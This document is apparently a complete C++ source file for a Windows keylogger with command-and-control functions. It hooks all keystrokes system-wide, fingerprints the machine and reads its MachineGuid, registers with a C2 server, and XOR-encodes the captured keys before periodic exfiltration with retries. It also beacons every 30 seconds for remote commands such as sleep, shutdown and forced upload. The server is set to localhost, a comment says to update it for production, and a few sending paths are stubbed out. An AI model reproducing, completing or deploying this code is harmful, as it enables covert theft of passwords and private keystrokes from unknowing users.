#include <windows.h>
#include <wininet.h>
#include <string>
#include <thread>
#include <chrono>
#include <sstream>
#include <algorithm>
#include <iomanip>
#include <fstream>
#include <ctime>

using namespace std;

// Global variables
string client_id;
string c2_server = "http://localhost:8080"; // Update for production
string shared_secret = "SecretKey123";      // Will be rotated
char encryption_key = 0x42;                 // Starting key for XOR
string key_buffer;
bool registered = false;
int exfiltration_retry_count = 3;

// Enhanced XOR encoding with key rotation
string xor_encode_with_rotation(const string& data, char& key) {
    string result;
    for (char c : data) {
        result += (c ^ key);
        // Circular shift key right by 1 bit after each XOR
        key = (key >> 1) | ((key & 1) << 7);
    }
    return result;
}

string xor_decode_with_rotation(const string& data, char key) {
    string result;
    for (char c : data) {
        result += (c ^ key);
        // Same rotation as encoding
        key = (key >> 1) | ((key & 1) << 7);
    }
    return result;
}

// Simple XOR without rotation (for backward compatibility)
string xor_encode(const string& data, char key) {
    string result;
    for (char c : data) {
        result += (c ^ key);
    }
    return result;
}

string rotate_right(const string& data, int amount) {
    if (data.empty()) return data;
    amount %= data.size();
    return data.substr(data.size() - amount) + data.substr(0, data.size() - amount);
}

// Get current timestamp
string get_timestamp() {
    auto now = chrono::system_clock::now();
    auto time_t = chrono::system_clock::to_time_t(now);
    stringstream ss;
    ss << put_time(localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

// Get system information for fingerprinting
string get_system_info() {
    stringstream info;
    
    // Get OS version
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (GetVersionEx(&osvi)) {
        info << "OS:" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
    }
    
    // Get architecture
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    info << ";ARCH:";
    switch(si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            info << "x64";
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            info << "x86";
            break;
        default:
            info << "unknown";
    }
    
    // Get computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size)) {
        info << ";HOST:" << computerName;
    }
    
    return info.str();
}

// Enhanced key mapping
string get_key_name(DWORD vk_code) {
    switch(vk_code) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_ESCAPE: return "[ESC]";
        case VK_DELETE: return "[DEL]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_SHIFT: 
        case VK_LSHIFT: 
        case VK_RSHIFT: return "[SHIFT]";
        case VK_CONTROL: 
        case VK_LCONTROL: 
        case VK_RCONTROL: return "[CTRL]";
        case VK_MENU: 
        case VK_LMENU: 
        case VK_RMENU: return "[ALT]";
        case VK_LWIN: 
        case VK_RWIN: return "[WIN]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_NUMLOCK: return "[NUM]";
        case VK_SCROLL: return "[SCROLL]";
        case VK_PRIOR: return "[PGUP]";
        case VK_NEXT: return "[PGDN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_INSERT: return "[INS]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        default:
            if (vk_code >= 'A' && vk_code <= 'Z') {
                bool shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool caps_on = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                
                if ((shift_pressed && !caps_on) || (!shift_pressed && caps_on)) {
                    return string(1, (char)vk_code);
                } else {
                    return string(1, (char)(vk_code + 32));
                }
            }
            if (vk_code >= '0' && vk_code <= '9') {
                return string(1, (char)vk_code);
            }
            switch(vk_code) {
                case VK_OEM_PERIOD: return ".";
                case VK_OEM_COMMA: return ",";
                case VK_OEM_MINUS: return "-";
                case VK_OEM_PLUS: return "=";
                case VK_OEM_1: return ";";
                case VK_OEM_2: return "/";
                case VK_OEM_3: return "`";
                case VK_OEM_4: return "[";
                case VK_OEM_5: return "\\";
                case VK_OEM_6: return "]";
                case VK_OEM_7: return "'";
                default: return "[" + to_string(vk_code) + "]";
            }
    }
}

// Keylogger callback
LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) return CallNextHookEx(NULL, nCode, wParam, lParam);
    
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)lParam;
        DWORD key_code = key->vkCode;
        
        string key_name = get_key_name(key_code);
        key_buffer += key_name;
        
        // Limit buffer size and trigger exfiltration
        if (key_buffer.length() > 5000) {
            // Trigger exfiltration in a separate thread
            thread([](string data) {
                // This will be handled by the exfiltration function
            }, key_buffer).detach();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// HTTP request helper with encoding
bool send_http_request(const string& endpoint, const string& method = "GET", 
                      const string& data = "", string* response = nullptr) {
    try {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                                          INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return false;
        
        string full_url = c2_server + endpoint;
        HINTERNET hUrl = InternetOpenUrlA(hInternet, full_url.c_str(), NULL, 0, 
                                         INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (hUrl) {
            if (method == "POST" && !data.empty()) {
                // For POST, we'd need to use HttpOpenRequest and HttpSendRequest
                // Simplified for this example
            }
            
            if (response) {
                char buffer[4096] = {0};
                DWORD read = 0;
                if (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &read) && read > 0) {
                    *response = string(buffer, read);
                }
            }
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hInternet);
        return true;
    } catch (...) {
        return false;
    }
}

// Register with C2 server
bool register_with_c2() {
    string sys_info = get_system_info();
    char key_copy = encryption_key;
    string encoded_info = xor_encode_with_rotation(sys_info, key_copy);
    
    string endpoint = "/register?id=" + client_id + "&info=" + encoded_info;
    string response;
    
    if (send_http_request(endpoint, "GET", "", &response)) {
        registered = true;
        return true;
    }
    return false;
}

// Exfiltrate data with retry mechanism
bool exfiltrate_keylog_data(const string& data) {
    for (int attempt = 0; attempt < exfiltration_retry_count; attempt++) {
        try {
            char key_copy = encryption_key;
            string encoded_data = xor_encode_with_rotation(data, key_copy);
            
            string endpoint = "/upload?id=" + client_id;
            string response;
            
            if (send_http_request(endpoint, "POST", encoded_data, &response)) {
                // Check if server confirms successful upload
                if (response.find("SUCCESS") != string::npos || response.find("OK") != string::npos) {
                    return true;
                }
            }
            
            // Wait before retry
            Sleep(2000 * (attempt + 1)); // Exponential backoff
        } catch (...) {
            // Continue to next attempt
        }
    }
    return false;
}

// Periodic exfiltration function
void exfiltration_worker() {
    while (true) {
        Sleep(60000); // Every minute
        
        if (!key_buffer.empty()) {
            string data_to_send = key_buffer;
            if (exfiltrate_keylog_data(data_to_send)) {
                // Only clear buffer if exfiltration successful
                key_buffer.clear();
            }
        }
    }
}

// Command execution
void execute_command(const string& command) {
    if (command.find("slp ") == 0) {
        try {
            int n = stoi(command.substr(4));
            Sleep(n * 1000);
        } catch (...) {
            // Invalid sleep time, ignore
        }
    } else if (command == "shd") {
        ExitProcess(0);
    } else if (command.find("pwn ") == 0) {
        string message = command.substr(4);
        if (message.empty()) {
            message = "Sorry, you've been pwned, for educational purposes!";
        }
        wstring wmessage(message.begin(), message.end());
        MessageBoxW(NULL, wmessage.c_str(), L"PWNED!", MB_OK | MB_ICONWARNING);
    } else if (command == "get_keys") {
        // Force immediate exfiltration
        if (!key_buffer.empty()) {
            exfiltrate_keylog_data(key_buffer);
            key_buffer.clear();
        }
    }
}

// Enhanced beaconing with timestamp
void beacon() {
    while (true) {
        try {
            string timestamp = get_timestamp();
            char key_copy = encryption_key;
            string encoded_timestamp = xor_encode_with_rotation(timestamp, key_copy);
            
            string endpoint = "/command?id=" + client_id + "&ts=" + encoded_timestamp;
            string response;
            
            if (send_http_request(endpoint, "GET", "", &response)) {
                // Decode response
                if (!response.empty()) {
                    char decode_key = encryption_key;
                    string decoded_response = xor_decode_with_rotation(response, decode_key);
                    decoded_response.erase(decoded_response.find_last_not_of(" \t\r\n") + 1);
                    
                    if (!decoded_response.empty()) {
                        execute_command(decoded_response);
                    }
                }
            }
        } catch (...) {
            // Continue beaconing even if there are errors
        }
        
        Sleep(30000); // 30 seconds
    }
}

int main() {
    // Generate client ID from MachineGuid
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                     "SOFTWARE\\Microsoft\\Cryptography", 
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char guid[256] = {0};
        DWORD guidSize = sizeof(guid);
        DWORD type;
        
        if (RegQueryValueExA(hKey, "MachineGuid", NULL, &type, 
                           (BYTE*)guid, &guidSize) == ERROR_SUCCESS) {
            client_id = string(guid);
        } else {
            client_id = "unknown";
        }
        RegCloseKey(hKey);
    } else {
        client_id = "unknown";
    }
    
    // Fallback client ID
    if (client_id == "unknown") {
        stringstream ss;
        ss << "client_" << GetTickCount();
        client_id = ss.str();
    }
    
    // Register with C2 server
    for (int i = 0; i < 3; i++) {
        if (register_with_c2()) {
            break;
        }
        Sleep(5000); // Wait 5 seconds before retry
    }
    
    // Start exfiltration worker thread
    thread exfil_thread(exfiltration_worker);
    exfil_thread.detach();
    
    // Start beacon thread
    thread beacon_thread(beacon);
    beacon_thread.detach();
    
    // Set up keylogger
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_callback, 
                                  GetModuleHandle(NULL), 0);
    
    if (!hook) {
        // Failed to install hook
        return 1;
    }
    
    // Message loop
    MSG msg;
    while (true) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) {
                goto cleanup;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(100);
    }
    
cleanup:
    if (hook) {
        UnhookWindowsHookEx(hook);
    }
    return 0;
}
